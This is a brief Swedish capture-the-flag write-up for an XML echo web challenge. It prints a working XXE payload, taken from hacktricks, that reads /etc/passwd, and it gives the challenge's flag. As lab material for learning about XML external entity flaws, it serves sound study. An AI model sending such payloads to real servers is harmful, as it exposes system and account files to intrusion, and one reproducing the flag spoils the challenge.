# XML-kontroll
**Kontrollera din XML med vår webbtjänst!**
*Skriv in din XML-data, vänta några sekunder, och få (nästan) samma sträng tillbaka. Snabbt, enkelt och... ja, det är ganska meningslöst, men det fungerar (nästan) felfritt!*

*Servern används också för att lagra en hemlig flagga, men den är i säkert förvar i namnet på ett användarkonto så det finns (nästan) absolut ingen risk att någon läser ut den från filsystemet!*

[http://challs.crate.nu:16627](http://challs.crate.nu:16627)

## Solution
1. Kolla hacktricks.xyz, de har ett tips på en xml-payload för att läsa `/etc/passwd`, testar denna
2. ```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>``
3. Få flagga...


## Flag
**Flag:** `cratectf{xml_xxe_xploit_xpert}`
